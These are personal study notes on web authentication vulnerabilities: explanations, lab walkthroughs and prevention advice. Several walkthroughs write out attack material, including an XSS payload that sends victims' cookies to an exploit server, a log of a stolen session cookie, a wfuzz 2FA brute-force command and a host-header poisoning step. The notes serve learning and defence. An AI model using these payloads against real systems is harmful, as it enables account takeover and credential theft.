Conceptually, authentication vulnerabilities are easy to understand. However, they are usually critical because of the clear relationship between authentication and security.

Authentication vulnerabilities can allow attackers to gain access to sensitive data and functionality. They also expose additional attack surface for further exploits. For this reason, it's important to learn how to identify and exploit authentication vulnerabilities, and how to bypass common protection measures.

In this section, we explain:

```ad-summary
- The most common authentication mechanisms used by websites.
- Potential vulnerabilities in these mechanisms.
- Inherent vulnerabilities in different authentication mechanisms.
- Typical vulnerabilities that are introduced by their improper implementation.
- How you can make your own authentication mechanisms as robust as possible.
```

![Pasted image 20240918171637.png](../../../../IMAGES/Pasted%20image%2020240918171637.png)


## What is the difference between authentication and authorization?

Authentication is the process of verifying that a user is `who they claim to be`. Authorization involves verifying whether `a user is allowed to do something.`

For example, authentication determines whether someone attempting to access a website with the username Carlos123 really is the same person who created the account.

Once Carlos123 is authenticated, their permissions determine what they are authorized to do. For example, they may be authorized to access personal information about other users, or perform actions such as deleting another user's account.


## Brute-force attacks

A brute-force attack is when an attacker uses a system of trial and error to guess valid user credentials. These attacks are typically automated using wordlists of usernames and passwords. Automating this process, especially using dedicated tools, potentially enables an attacker to make vast numbers of login attempts at high speed.

Brute-forcing is not always just a case of making completely random guesses at usernames and passwords. By also using basic logic or publicly available knowledge, attackers can fine-tune brute-force attacks to make much more educated guesses. This considerably increases the efficiency of such attacks. Websites that rely on password-based login as their sole method of authenticating users can be highly vulnerable if they do not implement sufficient brute-force protection.


### Brute-forcing usernames

Usernames are especially easy to guess if they conform to a recognizable pattern, such as an email address. For example, it is very common to see business logins in the format firstname.lastname@somecompany.com. However, even if there is no obvious pattern, sometimes even high-privileged accounts are created using predictable usernames, such as admin or administrator.

During auditing, check whether the website discloses potential usernames publicly. For example, are you able to access user profiles without logging in? Even if the actual content of the profiles is hidden, the name used in the profile is sometimes the same as the login username. You should also check HTTP responses to see if any email addresses are disclosed. Occasionally, responses contain email addresses of high-privileged users, such as administrators or IT support.


### Brute-forcing passwords

Passwords can similarly be brute-forced, with the difficulty varying based on the strength of the password. Many websites adopt some form of password policy, which forces users to create high-entropy passwords that are, theoretically at least, harder to crack using brute-force alone. This typically involves enforcing passwords with:
```ad-info
 A minimum number of characters
 A mixture of lower and uppercase letters
 At least one special character
```


#### Brute-forcing passwords - Continued

However, while high-entropy passwords are difficult for computers alone to crack, we can use a basic knowledge of human behavior to exploit the vulnerabilities that users unwittingly introduce to this system. Rather than creating a strong password with a random combination of characters, users often take a password that they can remember and try to crowbar it into fitting the password policy. For example, if `mypassword` is not allowed, users may try something like `Mypassword1!` or `Myp4$$w0rd` instead.

In cases where the policy requires users to change their passwords on a regular basis, it is also common for users to just make minor, predictable changes to their preferred password. For example, `Mypassword1!` becomes `Mypassword1?` or `Mypassword2!`.

This knowledge of likely credentials and predictable patterns means that brute-force attacks can often be much more sophisticated, and therefore effective, than simply iterating through every possible combination of characters.


### Username enumeration


Username enumeration is when an attacker is able to observe changes in the website's behavior in order to identify whether a given username is valid.

Username enumeration typically occurs either on the login page, for example, when you enter a valid username but an incorrect password, or on registration forms when you enter a username that is already taken. This greatly reduces the time and effort required to brute-force a login because the attacker is able to quickly generate a shortlist of valid usernames.

#### LAB

![Pasted image 20240918172832.png](../../../../IMAGES/Pasted%20image%2020240918172832.png)
Once we get the wordlist, we can brute force it either using the burp intruder, or, hydra:



![Pasted image 20240918173325.png](../../../../IMAGES/Pasted%20image%2020240918173325.png)
We got the request, lets brute force our way in!:

![Pasted image 20240918181253.png](../../../../IMAGES/Pasted%20image%2020240918181253.png)


username `amarillo` got a different length than the others, we might know now that, `amarillo` is our username based on response size, and the response itself, lets find password using same method:

![Pasted image 20240918181850.png](../../../../IMAGES/Pasted%20image%2020240918181850.png)

Password is: `letmein`


![Pasted image 20240918181939.png](../../../../IMAGES/Pasted%20image%2020240918181939.png)



## Bypassing two-factor authentication

At times, the implementation of two-factor authentication is flawed to the point where it can be bypassed entirely.

If the user is first prompted to enter a password, and then prompted to enter a verification code on a separate page, the user is effectively in a "logged in" state before they have entered the verification code. In this case, it is worth testing to see if you can directly skip to "logged-in only" pages after completing the first authentication step. Occasionally, you will find that a website doesn't actually check whether or not you completed the second step before loading the page.

##### LAB

![Pasted image 20240918182749.png](../../../../IMAGES/Pasted%20image%2020240918182749.png)
When we login, we need a code sent to our email, if we go to email client, we get this:

![Pasted image 20240918183415.png](../../../../IMAGES/Pasted%20image%2020240918183415.png)
Now we are at this panel and have this in the url:

![Pasted image 20240918183520.png](../../../../IMAGES/Pasted%20image%2020240918183520.png)

If we try to log in carlos account, we will need his email, but we can bypass it by changing the last part of the URL to `my-account`:

![Pasted image 20240918183638.png](../../../../IMAGES/Pasted%20image%2020240918183638.png)


## Vulnerabilities in password-based login

For websites that adopt a password-based login process, users either register for an account themselves or they are assigned an account by an administrator. This account is associated with a unique username and a secret password, which the user enters in a login form to authenticate themselves.

In this scenario, the fact that they know the secret password is taken as sufficient proof of the user's identity. This means that the security of the website is compromised if an attacker is able to either obtain or guess the login credentials of another user.

This can be achieved in a number of ways. The following sections show how an attacker can use brute-force attacks, and some of the flaws in brute-force protection. You'll also learn about the vulnerabilities in HTTP basic authentication.

### LAB

![Pasted image 20240924132822.png](../../../../IMAGES/Pasted%20image%2020240924132822.png)

To begin with, we must do a little adjustment to our burp suite intruder, we need to use `grep-extract` to get our error message from the request in the following way:

![Pasted image 20240924165753.png](../../../../IMAGES/Pasted%20image%2020240924165753.png)
![Pasted image 20240924165804.png](../../../../IMAGES/Pasted%20image%2020240924165804.png)
Now, lets start the attack, I don't have the image but I also loaded in the user.txt file into the attack:

![Pasted image 20240924172441.png](../../../../IMAGES/Pasted%20image%2020240924172441.png)
Username `americas` has a slightly different warning than the others, we could assume this is our username, lets brute force the password:
![Pasted image 20240924173635.png](../../../../IMAGES/Pasted%20image%2020240924173635.png)
Password is: `computer`

Lets authenticate:

![Pasted image 20240924173740.png](../../../../IMAGES/Pasted%20image%2020240924173740.png)
![Pasted image 20240924173817.png](../../../../IMAGES/Pasted%20image%2020240924173817.png)

### LAB

![Pasted image 20240925125637.png](../../../../IMAGES/Pasted%20image%2020240925125637.png)
This lab contains some sort of IP anti brute force control that we must bypass, to do this, we must add the following header into our request:

`X-Forwarded-For:`

If we check on the response time each request takes, we are able to identify that when we enter an invalid username, response time is pretty much the same, but when we enter a valid username, response time increases, so, knowing this, we should do this:



![Pasted image 20240925130823.png](../../../../IMAGES/Pasted%20image%2020240925130823.png)
Add the X-Forwarded-For position in our intruder and the following payload:

![Pasted image 20240925130920.png](../../../../IMAGES/Pasted%20image%2020240925130920.png)
We will also need to add a second position for our usernames, like this:

![Pasted image 20240925131043.png](../../../../IMAGES/Pasted%20image%2020240925131043.png)
![Pasted image 20240925131051.png](../../../../IMAGES/Pasted%20image%2020240925131051.png)
![Pasted image 20240925144829.png](../../../../IMAGES/Pasted%20image%2020240925144829.png)
We got username `adserver`, password is:
![Pasted image 20240925144855.png](../../../../IMAGES/Pasted%20image%2020240925144855.png)
`thomas

Just like that, we finished the lab:

![Pasted image 20240925144938.png](../../../../IMAGES/Pasted%20image%2020240925144938.png)


## Flawed brute-force protection

It is highly likely that a brute-force attack will involve many failed guesses before the attacker successfully compromises an account. Logically, brute-force protection revolves around trying to make it as tricky as possible to automate the process and slow down the rate at which an attacker can attempt logins. The two most common ways of preventing brute-force attacks are:

```ad-important
- Locking the account that the remote user is trying to access if they make too many failed login attempts
- Blocking the remote user's IP address if they make too many login attempts in quick succession
```

Both approaches offer varying degrees of protection, but neither is invulnerable, especially if implemented using flawed logic.

For example, you might sometimes find that your IP is blocked if you fail to log in too many times. In some implementations, the counter for the number of failed attempts resets if the IP owner logs in successfully. This means an attacker would simply have to log in to their own account every few attempts to prevent this limit from ever being reached.

In this case, merely including your own login credentials at regular intervals throughout the wordlist is enough to render this defense virtually useless.

### Account locking

One way in which websites try to prevent brute-forcing is to lock the account if certain suspicious criteria are met, usually a set number of failed login attempts. Just as with normal login errors, responses from the server indicating that an account is locked can also help an attacker to enumerate usernames.

Locking an account offers a certain amount of protection against targeted brute-forcing of a specific account. However, this approach fails to adequately prevent brute-force attacks in which the attacker is just trying to gain access to any random account they can.

For example, the following method can be used to work around this kind of protection:
```ad-summary
- Establish a list of candidate usernames that are likely to be valid. This could be through username enumeration or simply based on a list of common usernames.
- Decide on a very small shortlist of passwords that you think at least one user is likely to have. Crucially, the number of passwords you select must not exceed the number of login attempts allowed. For example, if you have worked out that limit is 3 attempts, you need to pick a maximum of 3 password guesses.
- Using a tool such as Burp Intruder, try each of the selected passwords with each of the candidate usernames. This way, you can attempt to brute-force every account without triggering the account lock. You only need a single user to use one of the three passwords in order to compromise an account.
```

Account locking also fails to protect against credential stuffing attacks. This involves using a massive dictionary of `username:password` pairs, composed of genuine login credentials stolen in data breaches. Credential stuffing relies on the fact that many people reuse the same username and password on multiple websites and, therefore, there is a chance that some of the compromised credentials in the dictionary are also valid on the target website. Account locking does not protect against credential stuffing because each username is only being attempted once. Credential stuffing is particularly dangerous because it can sometimes result in the attacker compromising many different accounts with just a single automated attack. 

### User rate limiting

Another way websites try to prevent brute-force attacks is through user rate limiting. In this case, making too many login requests within a short period of time causes your IP address to be blocked. Typically, the IP can only be unblocked in one of the following ways:
```ad-info
- Automatically after a certain period of time has elapsed
- Manually by an administrator
- Manually by the user after successfully completing a CAPTCHA
```

User rate limiting is sometimes preferred to account locking due to being less prone to username enumeration and denial of service attacks. However, it is still not completely secure. As we saw an example of in an earlier lab, there are several ways an attacker can manipulate their apparent IP in order to bypass the block.

As the limit is based on the rate of HTTP requests sent from the user's IP address, it is sometimes also possible to bypass this defense if you can work out how to guess multiple passwords with a single request.


### HTTP basic authentication

Although fairly old, its relative simplicity and ease of implementation means you might sometimes see HTTP basic authentication being used. In HTTP basic authentication, the client receives an authentication token from the server, which is constructed by concatenating the username and password, and encoding it in Base64. This token is stored and managed by the browser, which automatically adds it to the Authorization header of every subsequent request as follows:

`Authorization: Basic base64(username:password)` 

For a number of reasons, this is generally not considered a secure authentication method. Firstly, it involves repeatedly sending the user's login credentials with every request. Unless the website also implements HSTS, user credentials are open to being captured in a man-in-the-middle attack.

In addition, implementations of HTTP basic authentication often don't support brute-force protection. As the token consists exclusively of static values, this can leave it vulnerable to being brute-forced.

HTTP basic authentication is also particularly vulnerable to session-related exploits, notably CSRF, against which it offers no protection on its own.

In some cases, exploiting vulnerable HTTP basic authentication might only grant an attacker access to a seemingly uninteresting page. However, in addition to providing a further attack surface, the credentials exposed in this way might be reused in other, more confidential contexts. 

## Vulnerabilities in multi-factor authentication

In this section, we'll look at some of the vulnerabilities that can occur in multi-factor authentication mechanisms. We've also provided several interactive labs to demonstrate how you can exploit these vulnerabilities in multi-factor authentication.

Many websites rely exclusively on single-factor authentication using a password to authenticate users. However, some require users to prove their identity using multiple authentication factors.

Verifying biometric factors is impractical for most websites. However, it is increasingly common to see both mandatory and optional `two-factor authentication (2FA)` based on **something you know** and **something you have**. This usually requires users to enter both a traditional password and a temporary verification code from an out-of-band physical device in their possession.

While it is sometimes possible for an attacker to obtain a single knowledge-based factor, such as a password, being able to simultaneously obtain another factor from an out-of-band source is considerably less likely. For this reason, two-factor authentication is demonstrably more secure than single-factor authentication. However, as with any security measure, it is only ever as secure as its implementation. Poorly implemented two-factor authentication can be beaten, or even bypassed entirely, just as single-factor authentication can.

It is also worth noting that the full benefits of multi-factor authentication are only achieved by verifying multiple different factors. Verifying the same factor in two different ways is not true two-factor authentication. Email-based 2FA is one such example. Although the user has to provide a password and a verification code, accessing the code only relies on them knowing the login credentials for their email account. Therefore, the knowledge authentication factor is simply being verified twice. 

### Two-factor authentication tokens

Verification codes are usually read by the user from a physical device of some kind. Many high-security websites now provide users with a dedicated device for this purpose, such as the RSA token or keypad device that you might use to access your online banking or work laptop. In addition to being purpose-built for security, these dedicated devices also have the advantage of generating the verification code directly. It is also common for websites to use a dedicated mobile app, such as **Google Authenticator**, for the same reason.

On the other hand, some websites send verification codes to a user's mobile phone as a text message. While this is technically still verifying the factor of "something you have", it is open to abuse. Firstly, the code is being transmitted via SMS rather than being generated by the device itself. This creates the potential for the code to be intercepted. There is also a risk of SIM swapping, whereby an attacker fraudulently obtains a SIM card with the victim's phone number. The attacker would then receive all SMS messages sent to the victim, including the one containing their verification code.

### Flawed two-factor verification logic

Sometimes flawed logic in two-factor authentication means that after a user has completed the initial login step, the website doesn't adequately verify that the same user is completing the second step.

For example, the user logs in with their normal credentials in the first step as follows:

```
POST /login-steps/first HTTP/1.1
Host: vulnerable-website.com
...
username=carlos&password=qwerty```
```

They are then assigned a cookie that relates to their account, before being taken to the second step of the login process:

```
HTTP/1.1 200 OK
Set-Cookie: account=carlos

GET /login-steps/second HTTP/1.1
Cookie: account=carlos
```

When submitting the verification code, the request uses this cookie to determine which account the user is trying to access:

```
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=carlos
...
verification-code=123456
```

In this case, an attacker could log in using their own credentials but then change the value of the account cookie to any arbitrary username when submitting the verification code.

```
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=victim-user
...
verification-code=123456
```

This is extremely dangerous if the attacker is then able to brute-force the verification code as it would allow them to log in to arbitrary users' accounts based entirely on their username. They would never even need to know the user's password.

#### LAB

![Pasted image 20240926164118.png](../../../../IMAGES/Pasted%20image%2020240926164118.png)

We need to send the login2 request to repeater and send the verify option for carlos username, this ensures that a code for the username `carlos` is being sent:


![Pasted image 20240926164910.png](../../../../IMAGES/Pasted%20image%2020240926164910.png)


Once we've sent the request, we need to brute force the security code, for this, i used the following:

` for i in {0000..9999}; do echo $i; done > 2facodes.txt` -> To generate numbers from 0000 to 9999 and save it in a file


`wfuzz -c -w 2facodes.txt -d "mfa-code=FUZZ" -u "https://0ac5006403c51099804b719200ce0076.web-security-academy.net/login2" -b "session=YaWIHMFv6VqOgd2RPzQAFvcp93RwZ7IU; verify=carlos" --hc 200


I used that wfuzz command, it bruteforces the 2FA code and gives it to me:

![Pasted image 20240926171117.png](../../../../IMAGES/Pasted%20image%2020240926171117.png)


So, 2FA code is `0574

Lets try to authenticate using username carlos:
![Pasted image 20240926171143.png](../../../../IMAGES/Pasted%20image%2020240926171143.png)

And we´re in:

![Pasted image 20240926171222.png](../../../../IMAGES/Pasted%20image%2020240926171222.png)
![Pasted image 20240926171306.png](../../../../IMAGES/Pasted%20image%2020240926171306.png)


### Brute-forcing 2FA verification codes

As with passwords, websites need to take steps to prevent brute-forcing of the 2FA verification code. This is especially important because the code is often a simple 4 or 6-digit number. Without adequate brute-force protection, cracking such a code is trivial.

Some websites attempt to prevent this by automatically logging a user out if they enter a certain number of incorrect verification codes. This is ineffective in practice because an advanced attacker can even automate this multi-step process by creating macros for Burp Intruder. The Turbo Intruder extension can also be used for this purpose.


## Vulnerabilities in other authentication mechanisms

In addition to the basic login functionality, most websites provide supplementary functionality to allow users to manage their account. For example, users can typically change their password or reset their password when they forget it. These mechanisms can also introduce vulnerabilities that can be exploited by an attacker.

Websites usually take care to avoid well-known vulnerabilities in their login pages. But it is easy to overlook the fact that you need to take similar steps to ensure that related functionality is equally as robust. This is especially important in cases where an attacker is able to create their own account and, consequently, has easy access to study these additional pages.

### Keeping users logged in

A common feature is the option to stay logged in even after closing a browser session. This is usually a simple checkbox labeled something like "Remember me" or "Keep me logged in".

This functionality is often implemented by generating a "remember me" token of some kind, which is then stored in a persistent cookie. As possessing this cookie effectively allows you to bypass the entire login process, it is best practice for this cookie to be impractical to guess. However, some websites generate this cookie based on a predictable concatenation of static values, such as the username and a timestamp. Some even use the password as part of the cookie. This approach is particularly dangerous if an attacker is able to create their own account because they can study their own cookie and potentially deduce how it is generated. Once they work out the formula, they can try to brute-force other users' cookies to gain access to their accounts.

Some websites assume that if the cookie is encrypted in some way it will not be guessable even if it does use static values. While this may be true if done correctly, naively "encrypting" the cookie using a simple two-way encoding like Base64 offers no protection whatsoever. Even using proper encryption with a one-way hash function is not completely bulletproof. If the attacker is able to easily identify the hashing algorithm, and no salt is used, they can potentially brute-force the cookie by simply hashing their wordlists. This method can be used to bypass login attempt limits if a similar limit isn't applied to cookie guesses.

Even if the attacker is not able to create their own account, they may still be able to exploit this vulnerability. Using the usual techniques, such as `XSS`, an attacker could steal another user's "remember me" cookie and deduce how the cookie is constructed from that. If the website was built using an open-source framework, the key details of the cookie construction may even be publicly documented. 

#### LAB

![Pasted image 20240927125009.png](../../../../IMAGES/Pasted%20image%2020240927125009.png)

Request:

![Pasted image 20240927130212.png](../../../../IMAGES/Pasted%20image%2020240927130212.png)
If we use inspector tool from burp, we can see the base in which the stay-logged-in cookie is constructed:

![Pasted image 20240927130256.png](../../../../IMAGES/Pasted%20image%2020240927130256.png)

It follows this structure:
`
`base64(username+':'md5HashOfPassword)`


So, we need to send that request to intruder and do this:
![Pasted image 20240927131642.png](../../../../IMAGES/Pasted%20image%2020240927131642.png)


![Pasted image 20240927130807.png](../../../../IMAGES/Pasted%20image%2020240927130807.png)
![Pasted image 20240927130815.png](../../../../IMAGES/Pasted%20image%2020240927130815.png)
![Pasted image 20240927132128.png](../../../../IMAGES/Pasted%20image%2020240927132128.png)
Just like that we completed the lab:

![Pasted image 20240927132204.png](../../../../IMAGES/Pasted%20image%2020240927132204.png)
### Keeping users logged in - Continued

In some rare cases, it may be possible to obtain a user's actual password in cleartext from a cookie, even if it is hashed. Hashed versions of well-known password lists are available online, so if the user's password appears in one of these lists, decrypting the hash can occasionally be as trivial as just pasting the hash into a search engine. This demonstrates the importance of salt in effective encryption.

##### LAB

![Pasted image 20240927132951.png](../../../../IMAGES/Pasted%20image%2020240927132951.png)
As the description says, this lab is vulnerable to `XSS` in the comment section:

![Pasted image 20240927133904.png](../../../../IMAGES/Pasted%20image%2020240927133904.png)

We can enter a payload to steal an user's cookie:

```js
<script>document.location='//exploit-0a5100b30484ebb2802716e9011800cb.exploit-server.net/'+document.cookie</script>
```

![Pasted image 20240927134249.png](../../../../IMAGES/Pasted%20image%2020240927134249.png)
If we go to our exploit server logs, we can see this:

![Pasted image 20240927134413.png](../../../../IMAGES/Pasted%20image%2020240927134413.png)
Seems like a secret (cookie) from our victim:


```cookie

10.0.4.235 2024-09-27 18:41:59 +0000 "GET /secret=62Gl05NdioA3apGNjKnBqjJRi4WOlrTp;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

```

If we decode the stay-logged-in cookie:

![Pasted image 20240927134607.png](../../../../IMAGES/Pasted%20image%2020240927134607.png)
![Pasted image 20240927134616.png](../../../../IMAGES/Pasted%20image%2020240927134616.png)
Like that, we got carlos user password!:

![Pasted image 20240927134712.png](../../../../IMAGES/Pasted%20image%2020240927134712.png)


### Resetting user passwords

In practice some users will forget their password, so it is common to have a way for them to reset it. As the usual password-based authentication is obviously impossible in this scenario, websites have to rely on alternative methods to make sure that the real user is resetting their own password. For this reason, the password reset functionality is inherently dangerous and needs to be implemented securely.

There are a few different ways that this feature is commonly implemented, with varying degrees of vulnerability.

#### Sending passwords by email

It should go without saying that sending users their current password should never be possible if a website handles passwords securely in the first place. Instead, some websites generate a new password and send this to the user via email.

Generally speaking, sending persistent passwords over insecure channels is to be avoided. In this case, the security relies on either the generated password expiring after a very short period, or the user changing their password again immediately. Otherwise, this approach is highly susceptible to man-in-the-middle attacks.

Email is also generally not considered secure given that inboxes are both persistent and not really designed for secure storage of confidential information. Many users also automatically sync their inbox between multiple devices across insecure channels.

#### Resetting passwords using a URL

A more robust method of resetting passwords is to send a unique URL to users that takes them to a password reset page. Less secure implementations of this method use a URL with an easily guessable parameter to identify which account is being reset, for example:

`http://vulnerable-website.com/reset-password?user=victim-user`

In this example, an attacker could change the user parameter to refer to any username they have identified. They would then be taken straight to a page where they can potentially set a new password for this arbitrary user.

A better implementation of this process is to generate a high-entropy, hard-to-guess token and create the reset URL based on that. In the best case scenario, this URL should provide no hints about which user's password is being reset.
 
`http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8`

When the user visits this URL, the system should check whether this token exists on the back-end and, if so, which user's password it is supposed to reset. This token should expire after a short period of time and be destroyed immediately after the password has been reset.

However, some websites fail to also validate the token again when the reset form is submitted. In this case, an attacker could simply visit the reset form from their own account, delete the token, and leverage this page to reset an arbitrary user's password. 

##### LAB 1

![Pasted image 20241001125644.png](../../../../IMAGES/Pasted%20image%2020241001125644.png)
The moment I went to change my password, I got this request:

![Pasted image 20241001132822.png](../../../../IMAGES/Pasted%20image%2020241001132822.png)
That's when I changed the username value from `wiener` to `carlos`, I got 302 request code, let's see if it changed carlos password:

![Pasted image 20241001134344.png](../../../../IMAGES/Pasted%20image%2020241001134344.png)


If the URL in the reset email is generated dynamically, this may also be vulnerable to password reset poisoning. In this case, an attacker can potentially steal another user's token and use it change their password. 

##### LAB 2
![Pasted image 20241001134523.png](../../../../IMAGES/Pasted%20image%2020241001134523.png)

For this lab, we must modify the following request:

![Pasted image 20241001141030.png](../../../../IMAGES/Pasted%20image%2020241001141030.png)
As the lab said, we must steal carlos token to reset his password, for this, I modified the request with the following header:

`X-Forwarded-Host`

Simple explanation of this header:

![Pasted image 20241001141510.png](../../../../IMAGES/Pasted%20image%2020241001141510.png)


I used it like this:

`X-Forwarded-For: exploit-0ab4003303c61a198248651a018000f3.exploit-server.net`

I used the URL from my exploit server, also, modified request looks like this:

![Pasted image 20241001141620.png](../../../../IMAGES/Pasted%20image%2020241001141620.png)

If we go to our exploit server logs, we can see this:

![Pasted image 20241001141818.png](../../../../IMAGES/Pasted%20image%2020241001141818.png)

Seems like carlos clicked on the link and we got his password token, now, let's change his password:


![Pasted image 20241001142152.png](../../../../IMAGES/Pasted%20image%2020241001142152.png)
![Pasted image 20241001143728.png](../../../../IMAGES/Pasted%20image%2020241001143728.png)
Like that, we finished the lab.

### Changing user passwords

Typically, changing your password involves entering your current password and then the new password twice. These pages fundamentally rely on the same process for checking that usernames and current passwords match as a normal login page does. Therefore, these pages can be vulnerable to the same techniques.

Password change functionality can be particularly dangerous if it allows an attacker to access it directly without being logged in as the victim user. For example, if the username is provided in a hidden field, an attacker might be able to edit this value in the request to target arbitrary users. This can potentially be exploited to enumerate usernames and brute-force passwords.


#### LAB

![Pasted image 20241001144341.png](../../../../IMAGES/Pasted%20image%2020241001144341.png)

When we go and change our password using our own account, we get this request:

![Pasted image 20241001145039.png](../../../../IMAGES/Pasted%20image%2020241001145039.png)
If we set different values for password1 and password 2, we get the message:

`New passowrds do not match`

Knowing this, we can brute force carlos password in the following way:

![Pasted image 20241001145201.png](../../../../IMAGES/Pasted%20image%2020241001145201.png)

When we got our payload set, we need to add a grep match condition, which is the `New passwords do not match` flag we get when our current password is correct but, our new passwords are different:

![Pasted image 20241001145300.png](../../../../IMAGES/Pasted%20image%2020241001145300.png)

Let's launch the attack:


![Pasted image 20241001164920.png](../../../../IMAGES/Pasted%20image%2020241001164920.png)

Carlos password is taylor, let's log in:

![Pasted image 20241001165027.png](../../../../IMAGES/Pasted%20image%2020241001165027.png)



## Preventing attacks on your own authentication mechanisms

We have demonstrated several ways in which websites can be vulnerable due to how they implement authentication. To reduce the risk of such attacks on your own websites, there are several principles that you should always try to follow.

### Take care with user credentials

Even the most robust authentication mechanisms are ineffective if you unwittingly disclose a valid set of login credentials to an attacker. It should go without saying that you should never send any login data over unencrypted connections. Although you may have implemented HTTPS for your login requests, make sure that you enforce this by redirecting any attempted HTTP requests to HTTPS as well.

You should also audit your website to make sure that no username or email addresses are disclosed either through publicly accessible profiles or reflected in HTTP responses, for example.

### Don't count on users for security

Strict authentication measures often require some additional effort from your users. Human nature makes it all but inevitable that some users will find ways to save themselves this effort. Therefore, you need to enforce secure behavior wherever possible.

The most obvious example is to implement an effective password policy. Some of the more traditional policies fall down because people crowbar their own predictable passwords into the policy. Instead, it can be more effective to implement a simple password checker of some kind, which allows users to experiment with passwords and provides feedback about their strength in real time. A popular example is the JavaScript library zxcvbn, which was developed by Dropbox. By only allowing passwords which are rated highly by the password checker, you can enforce the use of secure passwords more effectively than you can with traditional policies.

### Prevent username enumeration

It is considerably easier for an attacker to break your authentication mechanisms if you reveal that a user exists on the system. There are even certain situations where, due to the nature of the website, the knowledge that a particular person has an account is sensitive information in itself.

Regardless of whether an attempted username is valid, it is important to use identical, generic error messages, and make sure they really are identical. You should always return the same HTTP status code with each login request and, finally, make the response times in different scenarios as indistinguishable as possible.
### Implement robust brute-force protection

Given how simple constructing a brute-force attack can be, it is vital to ensure that you take steps to prevent, or at least disrupt, any attempts to brute-force logins.

One of the more effective methods is to implement strict, IP-based user rate limiting. This should involve measures to prevent attackers from manipulating their apparent IP address. Ideally, you should require the user to complete a CAPTCHA test with every login attempt after a certain limit is reached.

Keep in mind that this is not guaranteed to completely eliminate the threat of brute-forcing. However, making the process as tedious and manual as possible increases the likelihood that any would-be attacker gives up and goes in search of a softer target instead.


### Triple-check your verification logic

As demonstrated by our labs, it is easy for simple logic flaws to creep into code which, in the case of authentication, have the potential to completely compromise your website and users. Auditing any verification or validation logic thoroughly to eliminate flaws is absolutely key to robust authentication. A check that can be bypassed is, ultimately, not much better than no check at all.

### Don't forget supplementary functionality

Be sure not to just focus on the central login pages and overlook additional functionality related to authentication. This is particularly important in cases where the attacker is free to register their own account and explore this functionality. Remember that a password reset or change is just as valid an attack surface as the main login mechanism and, consequently, must be equally as robust.

### Implement proper multi-factor authentication

While multi-factor authentication may not be practical for every website, when done properly it is much more secure than password-based login alone. Remember that verifying multiple instances of the same factor is not true multi-factor authentication. Sending verification codes via email is essentially just a more long-winded form of single-factor authentication.

SMS-based 2FA is technically verifying two factors (something you know and something you have). However, the potential for abuse through SIM swapping, for example, means that this system can be unreliable.

Ideally, 2FA should be implemented using a dedicated device or app that generates the verification code directly. As they are purpose-built to provide security, these are typically more secure.

Finally, just as with the main authentication logic, make sure that the logic in your 2FA checks is sound so that it cannot be easily bypassed.
